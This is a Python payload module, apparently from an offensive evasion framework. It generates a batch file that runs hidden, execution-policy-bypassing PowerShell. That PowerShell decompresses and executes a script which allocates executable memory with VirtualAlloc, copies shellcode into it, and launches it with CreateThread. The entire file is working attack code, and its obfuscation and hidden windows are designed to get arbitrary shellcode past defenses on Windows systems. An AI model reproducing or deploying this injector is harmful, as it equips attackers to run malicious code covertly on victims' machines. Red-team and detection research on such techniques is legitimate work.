"""

Powershell method to inject inline shellcode.

Original concept from Matthew Graeber: http://www.exploit-monday.com/2011/10/exploiting-powershells-features-not.html

Note: the architecture independent invoker was developed independently from
    https://www.trustedsec.com/may-2013/native-powershell-x86-shellcode-injection-on-64-bit-platforms/


Module built by @harmj0y

"""

from modules.common import shellcode
from modules.common import helpers

class Payload:

    def __init__(self):
        # required
        self.description = "PowerShell VirtualAlloc method for inline shellcode injection"
        self.rating = "Excellent"
        self.language = "powershell"
        self.extension = "bat"

        self.required_options = {}

        self.shellcode = shellcode.Shellcode()

    def psRaw(self):

        Shellcode = self.shellcode.generate(self.required_options)
        Shellcode = ",0".join(Shellcode.split("\\"))[1:]

        baseString = """$c = @"
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr w, uint x, uint y, uint z);
[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr u, uint v, IntPtr w, IntPtr x, uint y, IntPtr z);
[DllImport("msvcrt.dll")] public static extern IntPtr memset(IntPtr x, uint y, uint z);
"@
$o = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru
$x=$o::VirtualAlloc(0,0x1000,0x3000,0x40); [Byte[]]$sc = %s;
for ($i=0;$i -le ($sc.Length-1);$i++) {$o::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1) | out-null;}
$z=$o::CreateThread(0,0,$x,0,0,0); Start-Sleep -Second 100000""" % (Shellcode)

        return baseString

    def generate(self):

        encoded = helpers.deflate(self.psRaw())

        payloadCode = "@echo off\n"
        payloadCode += "if %PROCESSOR_ARCHITECTURE%==x86 ("
        payloadCode += "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\\\"%s\\\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\"" % (encoded)
        payloadCode += ") else ("
        payloadCode += "%%WinDir%%\\syswow64\\windowspowershell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\\\"%s\\\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\")" % (encoded)

        return payloadCode
